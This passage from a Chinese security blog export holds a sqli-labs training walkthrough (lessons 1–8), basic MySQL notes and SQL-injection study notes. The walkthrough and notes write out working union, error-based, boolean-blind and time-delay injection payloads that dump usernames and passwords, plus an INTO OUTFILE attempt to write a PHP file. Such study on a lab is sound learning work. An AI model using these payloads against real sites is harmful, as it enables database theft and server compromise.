        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_less_1-7</title>
    <url>/2020/03/20/sqli-labs-less-1-7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>sqli-labs 关卡1-8，第七关不会(…</p>
<a id="more"></a>


<p>2020-03-20 14:46:33 Friday</p>
<h2 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS 1"></a>LESS 1</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_141605.jpg" alt=""></p>
<p>尝试在id后面加上单引号，报错，id后加入双引号，输出默认内容，是单引号型的。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_141743.jpg" alt=""><br>使用order by 查询列数（通过二分法），使用<code>--+</code>来闭合单引号。+号在URL解释中一般为空格。<br>最后通过二分法可以查得列数为3.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_142054.jpg" alt=""><br>给id填入一个极大的数字（数据库不存在的id值）使用unino select 1，3，3联合查询看当前页面是否右显示位置。可以看出当前页面只有3，3的值。所以联合查询的1，可以不用进行过多操作了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_142801.jpg" alt=""></p>
<p>通过<code>database()</code>查询出当前数据库名字后，根据数据库名字查询出当前数据库的表名为users。<br>完整字段如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;999&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_143353.jpg" alt=""><br>查出security数据库的表名一共右emalis，users，refer，agen什么的。不过那些都不重要，渗透测试主要是拿到管理员帐号，其他的个人信息，我们不应该去触碰。因为这是违法的。</p>
<p>利用爆破出来的表名users查询列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;999&#39; union select 1,database(),group_concat(column_name) rom information_schema.columns where table_name&#x3D;&#39;users&#39;20--+</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_143842.jpg" alt=""></p>
<p>最后使用查询到的列名username,password，出用户的帐号和密码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;999&#39; union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure>
<p>eric.liao<br>jrwen.liao</p>
<p>oscar.yuyu<br>@3109.amp</p>
<h2 id="LESS-2"><a href="#LESS-2" class="headerlink" title="LESS 2"></a>LESS 2</h2><p>直接上去给它id后加个单引号，报错。测试双引号，同样报错，可以排除是单引号和双引号型的，直接试试order by，可执行所以是数值型的，同样是通过二分法测得列数为3.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_164601.jpg" alt=""></p>
<p>其余步骤和Less 1 差不多，区别在于Less 1 需要手动闭合单引号，Less 2 无需手动闭合。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200320_165252.jpg" alt=""></p>
<h2 id="LESS-3"><a href="#LESS-3" class="headerlink" title="LESS 3"></a>LESS 3</h2><p>我先是单独使用了单引号测输出结果，但是报错。转为使用双引号测试有显示输出，但是加上order by 之后显示不正常，同时我这里没有使用–+闭合，也没有输出语法错误的提示，可以确定没有正确闭合。可能是括号引号的字符型<br><img src="https://images.atsud0.me/images/post/Screenshot_20200320_172859.jpg" alt=""></p>
<p>使用单个双引号 加单个括号 ”)，结果同样如上，把双引号改成单引号，后输出正常。Less3是单引号括号型的。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200320_173236.jpg" alt=""></p>
<p>其他步骤和LESS 1 一样。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200320_172549.jpg" alt=""></p>
<h2 id="LESS-4"><a href="#LESS-4" class="headerlink" title="LESS 4"></a>LESS 4</h2><p>和LESS 3区别仅在于LESS 4是双引号单括号的闭合方式“)<br><img src="https://images.atsud0.me/images/post/Screenshot_20200320_192618.jpg" alt=""></p>
<h2 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS 5"></a>LESS 5</h2><p>首先判断闭合，单引号报错，双引号显示默认内容，可以确定是单引号型的。</p>
<p><img src="https://images.atsud0.me/images/post/image-1584974255601.png" alt="file"></p>
<p><strong>extractvalue(arg1,arg2)函数<br>arg1是字符串，arg2则是xpath语句。注入点就在arg2中。查询语句基本上和LESS1 union查询一致。</strong></p>
<p>获取当前数据库名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1584975200183.png" alt="file"></p>
<p>获取当前表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()),0x7e))%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1584975314378.png" alt="file"></p>
<p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-5&#x2F;?id&#x3D;1%27%20and%20extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27users%27),0x7e))%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1584975395910.png" alt="file"></p>
<p>获取用户名和密码，因为函数的限制，要分两次来进行查询，并且输出长度最高为32。</p>
<p><img src="https://images.atsud0.me/images/post/image-1584975631297.png" alt="file"></p>
<p><img src="https://images.atsud0.me/images/post/image-1584975665340.png" alt="file"></p>
<h2 id="LESS-6"><a href="#LESS-6" class="headerlink" title="LESS 6"></a>LESS 6</h2><p>和LESS 5 一样，区别在于引号闭合不同。<br>不过我们可以尝试updatexml()来进行注入</p>
<p><strong>updatexml(arg1,arg2,arg3)<br>arg1为xml文档对象的名称<br>arg2为xpath格式的字符串<br>arg3为string格式，替换查找到的符合条件的数据</strong></p>
<p>获取当前数据库名，余下的步骤基本和less5一致。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1%22%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20--+</span><br></pre></td></tr></table></figure>
<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()),0x7e),1)%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1584976319143.png" alt="file"></p>
<p>‘</p>
<p>获取列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;database()%20and%20table_name&#x3D;%27users%27),0x7e),1)%20--+</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1584976416083.png" alt="file"></p>
<p>获取数据<br><img src="https://images.atsud0.me/images/post/image-1584976207319.png" alt="file"><br><img src="https://images.atsud0.me/images/post/image-1584976452539.png" alt="file"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-6&#x2F;?id&#x3D;1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20security.users%20),0x7e),1)%20%20--+</span><br></pre></td></tr></table></figure>
<p>updatexml 和 extractvalue 函数限制一样，只有一个显示位。并且输出长度有32位限制。</p>
<h2 id="LESS-7"><a href="#LESS-7" class="headerlink" title="LESS 7"></a>LESS 7</h2><p>待更新…<br>不成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27))%20union%20select%201,2,3%20into%20outfile %27E:\\phpStudy\\PHPTutorial\WWW\\sqli-labs-master\\images\\123456.php%27%20--+</span><br></pre></td></tr></table></figure>
<p>这样是成功的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-7&#x2F;?id&#x3D;1%27))%20union%20select%201,2,3</span><br></pre></td></tr></table></figure>

<h2 id="LESS-8"><a href="#LESS-8" class="headerlink" title="LESS 8"></a>LESS 8</h2><p>先是判断闭合</p>
<p>是单引号闭合，使用order by判断出字段数是3，要是错误的话也只是不输出信息，没有报错。所以接着使用union，和extractvalue报错注入都没用正常输出。</p>
<p>使用布尔注入，一步步分解判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27%20%20and%20(select%20count(*)%20from%20information_schema.tables%20where%20table_schema&#x3D;database())%20%3E5%20--+</span><br></pre></td></tr></table></figure>
<p>判断出当前数据库数据表数量小于5，但是大于3时有正常输出，接着用4判断，无输出。改为等于4。得出数据表数量为4.</p>
<p>接着使用Lenght(table_name) 判断当前表名的长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27%20%20and%20(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1)%20&#x3D;6--+</span><br></pre></td></tr></table></figure>

<p>数据表名长度为6<br>接着就要拆解数据表名了</p>
<p>先判断是否是小写字母开头的单词</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt; 97 --+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27 and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br></pre></td></tr></table></figure>
<p>当大于101时无回显，第一个字母为e</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1),2,1))&#x3D;109--+</span><br></pre></td></tr></table></figure>
<p>测得第二个字母为m<br>步骤太为繁琐，需要一步步测试下去。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.99.122&#x2F;sqli-labs-master&#x2F;Less-8&#x2F;?id&#x3D;1%27%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20limit%200,1),3,1))&#x3D;97--+</span><br></pre></td></tr></table></figure>
<p>第三个字母为a，ema 并且长度为6的字符串，应该就是emails了，<br>limit 2,1 2为第二个字段，1则为限制出输出结果数量。如果是limit 2,2的话就是输出两个字段了。<br>substr((select ….这里就是我们要查询的语句 limit ),1,1)第二个1为start 即该字符串所在的位置，开头。</p>
<p>先判断表数量，接着判断数据表长度，再判断表名，找到你想要查找信息的表之后。接着判断列数量，和列长度，再判断列名，最后判断数据。步骤一致，较为繁琐。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
      </categories>
      <tags>
        <tag>sql_injection</tag>
      </tags>
  </entry>
  <entry>
    <title>sql基本操作</title>
    <url>/2020/04/16/sql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一些sql的基本命令</p>
<a id="more"></a>


<h3 id="sql特点"><a href="#sql特点" class="headerlink" title="sql特点"></a>sql特点</h3><ol>
<li>关系数据结构<br>二维表</li>
<li>关系操作集合</li>
<li>关系完整性约束<br> 表内约束 对应的列只能放对应的数据<br> 表间约束 自然界各实体都是有对应的关联关系(外键)</li>
</ol>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">-h --host</span><br><span class="line">-P --port</span><br><span class="line">-u --user</span><br><span class="line">-p --password</span><br></pre></td></tr></table></figure>
<p>注意，建议密文输入密码，不要明文。</p>
<h4 id="登出"><a href="#登出" class="headerlink" title="登出"></a>登出</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit;</span><br><span class="line">\q;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure>

<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p><code>create database name[option];</code><br>options是可选的，可以指定字符集和校对集.</p>
<p>字符集<code>charset</code><br>校对集<code>collate</code></p>
<p>字符集，代表当前数据库下的表存储的数据默认的字符集，如果不指定，就使用默认的<br><code>/mysql/data/name/db.opt</code><br>这个文件里面有默认的选项</p>
<h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table name(</span><br><span class="line">    column_name column_type,</span><br><span class="line">    column_name2 column_type other</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>other 代表其他的属性<br>如不能为空，自增，主键，唯一键等。</p>
<h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><h5 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h5><p><code>show databases;</code><br><code>show databases like &#39;ch%&#39;</code><br>显示ch开头的数据库</p>
<p>匹配模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_匹配任意单字符</span><br><span class="line">%匹配多个字符</span><br></pre></td></tr></table></figure>

<h4 id="查询所有表"><a href="#查询所有表" class="headerlink" title="查询所有表"></a>查询所有表</h4><p><code>show tables;</code><br><code>show tables like &#39;匹配模式&#39;;</code><br><code>desc table_name</code> 显示表结构</p>
<h4 id="显示数据库创建语句"><a href="#显示数据库创建语句" class="headerlink" title="显示数据库创建语句"></a>显示数据库创建语句</h4><p><code>show create database database_name;</code></p>
<h4 id="显示表创建语句"><a href="#显示表创建语句" class="headerlink" title="显示表创建语句"></a>显示表创建语句</h4><p><code>show create table table_name;</code></p>
<h4 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h4><p><code>use databasename</code></p>
<h4 id="修改数据库选项"><a href="#修改数据库选项" class="headerlink" title="修改数据库选项"></a>修改数据库选项</h4><p>字符集和校对集</p>
<p><code>alter database databasename charset=gbk;</code></p>
<p>如果修改了，数据库的opt文件就会体现。</p>
<h4 id="修改表选项"><a href="#修改表选项" class="headerlink" title="修改表选项"></a>修改表选项</h4><p><code>alter table table_name options=values</code><br>数据库名不可改，但表名可以。<br><code>rename table test to new</code><br>test改名为new</p>
<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p><code>drop database databasename</code><br>删除数据库<br><code>drop table table_name</code><br>删除数据表<br><code>alter table table_name drop 字段</code><br>删除字段</p>
<h4 id="复制表结构"><a href="#复制表结构" class="headerlink" title="复制表结构"></a>复制表结构</h4><p><code>create table new_table_name like table_name</code><br>只复制结构，但是不会复制表的数据.</p>
<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><p><code>insert into table_name() values();</code></p>
<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p><code>selete * from table_name</code><br><code>select 字段 from table_name</code><br><code>select * from table_name where</code>where 条件。</p>
<h3 id="设置字符集"><a href="#设置字符集" class="headerlink" title="设置字符集"></a>设置字符集</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set names;</span><br><span class="line">show variables like &#39;character_set%&#39;</span><br></pre></td></tr></table></figure>

<h3 id="列属性"><a href="#列属性" class="headerlink" title="列属性"></a>列属性</h3><p>null<br>default<br>例描述<br>主键 <code>primary key</code><br>唯一键 <code>unique</code><br>自动增长 <code>auto_incerment</code></p>
<h4 id="创建主键"><a href="#创建主键" class="headerlink" title="创建主键"></a>创建主键</h4><p>方案1</p>
<p>直接在字段后增加</p>
<p>方案2</p>
<p>在所有字段之后增加主键选项</p>
<p>方案3</p>
<p><code>alter table table_name add primary key(字段);</code></p>
<h4 id="复合主键"><a href="#复合主键" class="headerlink" title="复合主键"></a>复合主键</h4><p><code>primary(id,c_id)</code></p>
<h4 id="自动增长"><a href="#自动增长" class="headerlink" title="自动增长"></a>自动增长</h4><p><code>auto_increment</code></p>
<p>随字段创建,可以设置步长，起始值。</p>
<h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p>分组查询</p>
<p><code>group_concat()</code></p>
<p>为了将分组中指定的字段进行合并(字符串拼接)</p>
<h3 id="order-by"><a href="#order-by" class="headerlink" title="!order by"></a>!order by</h3><p><code>order by 字段[asc|desc];</code><br>asc 升序,desc降序<br>默认降序</p>
<h3 id="Limit子句"><a href="#Limit子句" class="headerlink" title="!Limit子句"></a>!Limit子句</h3><p>用来限制记录数量获取<br>记<br>值得注意的是：mysql记录的数量从0开始</p>
<h3 id="union-联合查询"><a href="#union-联合查询" class="headerlink" title="!union 联合查询"></a>!union 联合查询</h3><p><code>select * from table1 union select * from table2;</code><br>all保存所有结果。<br>union理论只要保证字段数一样，不需要每次拿到的数据对应的字段类型一直。字段数取决于第一个<code>select</code>对应的字段语句</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入笔记</title>
    <url>/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>记录一些sql注入的笔记.. 大佬轻喷<br>參考:</p>
<ul>
<li><a href="https://www.cnblogs.com/kyx599/articles/12345471.html" title="" target="">kyx599的博客</a></li>
<li><a href="https://sqlmap.wiki/docs/web%E5%AE%89%E5%85%A8/sqli/" title="" target="">Dejavu的博客</a>
<a id="more"></a>

</li>
</ul>
<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><p>sql注入就是用户输入的值没有经过严格的过滤却被带进了数据库中当成了数据库语句去执行从而导致的漏洞.</p>
<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p><code>information_schema</code>mysql5.0版本之后才有的</p>
<p>三个重点表<code>schemata,tables,columns</code></p>
<ul>
<li>schemata   数据库信息</li>
</ul>
<p>重点字段：</p>
<pre><code>schema_name 数据库名字</code></pre><ul>
<li>tables     数据表信息</li>
</ul>
<p>重点字段：</p>
<pre><code>table_name  数据表名字
table_schema 数据库名字</code></pre><ul>
<li>columns    列的信息</li>
</ul>
<p>重点字段：</p>
<pre><code>table_name  数据表名字
table_schema 数据库名字
column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
<p>获取数据库版本<code>version()</code></p>
<p>获取数据库绝对路径<code>@@datadir</code></p>
<p>获取当前连接数据库的用户<code>user()</code></p>
<p>获取当前数据库<code>database()</code></p>
<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>联合查询步骤：</p>
<ol>
<li><p>判断注入点</p>
<ul>
<li>?id=1 and 1=2</li>
<li>?id=1 or 1=1</li>
<li>直接上order by ?id=1 order by 33333</li>
</ul>
</li>
<li><p>判断闭合情况 </p>
<ul>
<li>?id=1’ –+</li>
<li>?id=1” –+</li>
<li>在不考虑圆括号的情况下,单引号闭合插入双引号不会报错,双引号闭合中插入单引号不会报错.数字型插什么都报错</li>
</ul>
</li>
<li><p>判断查询字段数</p>
<ul>
<li>order by 1 正常</li>
<li>order by 10 (给个较大的数,通过二分法逐渐判断)</li>
</ul>
</li>
<li><p>判断显示位：</p>
<ul>
<li>?id=-1 union select 1,2,3(id一定要给个无效的参数,否则不会正确显示显示位)</li>
</ul>
</li>
<li><p>[判断mysql版本]</p>
<ul>
<li>version()</li>
</ul>
</li>
<li><p>[获取全部数据库名字]</p>
<ul>
<li>union select 1,group_concat(schema_name),3 from information_schema.schemata</li>
</ul>
</li>
<li><p>获取当前数据库下所有的表名</p>
<ul>
<li>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</li>
</ul>
</li>
<li><p>判断关键表(users)的列名</p>
<ul>
<li>union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=’users’</li>
</ul>
</li>
<li><p>获取数据</p>
<ul>
<li>union select 1,group_concat(username),group_concat(password) from users</li>
</ul>
</li>
</ol>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入不需要改<code>?id=-1</code><br>只有联合查询需要<br>报错注入,不值这两条语句,还有其他的.</p>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><code>extractvalue(arg1,arg2)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arg1 string格式</span><br><span class="line">arg2 Xpath格式</span><br><span class="line"></span><br><span class="line">and extractvalue(1,concat(0x7e,(select version()),0x7e))</span><br><span class="line"></span><br><span class="line">最大长度限制32位</span><br></pre></td></tr></table></figure>

<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><code>updatexml(arg1,arg2,arg3)</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arg1为xml文档对象的名称</span><br><span class="line">arg2为xpath格式的字符串</span><br><span class="line">arg3为string格式，替换查找到的符合条件的数据</span><br><span class="line">and updatexml(1,concat(0x7e,(select version()),0x7e),1)</span><br><span class="line"></span><br><span class="line">最大长度限制32位</span><br></pre></td></tr></table></figure>

<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><h2 id="报错注入步骤"><a href="#报错注入步骤" class="headerlink" title="报错注入步骤"></a>报错注入步骤</h2><ol>
<li><p>判断引号闭合情况</p>
</li>
<li><p>获取所有数据库名字</p>
<ul>
<li><p>and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata ),0x7e))</p>
</li>
<li><p>and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata ),0x7e),1)</p>
</li>
</ul>
</li>
<li><p>获取当前数据库下所有表名</p>
<ul>
<li><p>and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))</p>
</li>
<li><p>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</p>
</li>
</ul>
</li>
<li><p>获取列名</p>
<ul>
<li><p>and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x7e))</p>
</li>
<li><p>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),0x7e),1)</p>
</li>
</ul>
</li>
<li><p>获取数据</p>
<ul>
<li><p>and extractvalue(1,concat(0x7e,(select group_concat(username) from users),0x7e))</p>
</li>
<li><p>and extractvalue(1,concat(0x7e,(select group_concat(password) from users),0x7e))</p>
</li>
<li><p>and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)</p>
</li>
<li><p>and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)</p>
</li>
</ul>
</li>
</ol>
<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><p>用到的函数</p>
<ul>
<li>length() 判断长度</li>
<li>ascii() 读取ascii码表</li>
<li>substr(string,start,length) 截取字符串</li>
<li>count(*)计数</li>
</ul>
<p>布尔注入是盲测，指你只能通过默认的回显页面去判断，并一步步拆解结果。步骤繁琐。较为困难…</p>
<h2 id="布尔注入步骤"><a href="#布尔注入步骤" class="headerlink" title="布尔注入步骤"></a>布尔注入步骤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、判断引号闭合</span><br><span class="line">二、获取数据库名字</span><br><span class="line">先得到数据库名的长度</span><br><span class="line">and length(database())&gt;5</span><br><span class="line">判断数据库名字的字符</span><br><span class="line">and ascii(substr(database(),1,1))&gt;97 --+</span><br><span class="line"></span><br><span class="line">三、判断当前数据库表数量</span><br><span class="line">and (select count(*) from information_schema.tables where table_schema&#x3D;database())&gt;5</span><br><span class="line">四、判断当前数据库表长度</span><br><span class="line">and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&gt;5</span><br><span class="line">五、猜解表名</span><br><span class="line">and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;97  </span><br><span class="line">limit 0,1 </span><br><span class="line">substr 1,1</span><br><span class="line">六、获取列的数量</span><br><span class="line">and (select count(*) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;)&gt;5</span><br><span class="line">七、获取每个列的长度</span><br><span class="line">and (select length(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1)&gt;5</span><br><span class="line">八、获取每个列的名字</span><br><span class="line">and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;97  </span><br><span class="line">八、获取数据</span><br><span class="line">获取第一个用户名的长度</span><br><span class="line">and (select length(username) from users limit 0,1)&gt;5</span><br><span class="line">猜解用户名的每个字符</span><br><span class="line">and ascii(substr((select username from users limit 0,1),1,1))&gt;97</span><br></pre></td></tr></table></figure>


<h1 id="时间延迟注入"><a href="#时间延迟注入" class="headerlink" title="时间延迟注入"></a>时间延迟注入</h1><p>时间延迟注入要用到的函数</p>
<ul>
<li>if(arg1,arg2,arg3)</li>
<li>sleep(arg1) (秒为单位)</li>
<li>benchmark(arg1,arg2)</li>
</ul>
<h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p><code>and if(payload,sleep(5),1)</code></p>
<p>如果时间正确则延迟五秒</p>
<h2 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h2><p><code>and if(payload,benchmark(50000000,md5(&#39;abc&#39;)),1)</code><br>延迟10秒左右,加密5千万次</p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="字符编码集"><a href="#字符编码集" class="headerlink" title="字符编码集"></a>字符编码集</h2><ul>
<li>ASCII码(单字节编码 第一位取0 如果取1那就是高位ASCII)</li>
<li>GBK编码(中文编码) gbk2个字节=1个汉字</li>
<li>UTF8(Unicode),Unicode完全兼容ASCII,UTF-8变长编码,根据不同的符号来变化长度 urf8 3个字节=1个汉字</li>
</ul>
<p>UTF8规定一个英文字符用一个字节,一个中文字符用三个字节表示</p>
<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>URL编码进制用的是是 ASCII 16进制<br>URL编码只解一次<br>八个二进制位和2个16进制位表示的值是一样的</p>
<p>要用到的函数</p>
<ul>
<li>addslashes()函数 转义函数</li>
</ul>
<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p><strong>要求数据库编码方式:GBK</strong></p>
<p>如果数据库编码为GBK时,那么一个GBK汉字就占两个字节,遇到连续两个字节,都符合GBK取值范围,则会自动解释成汉字.</p>
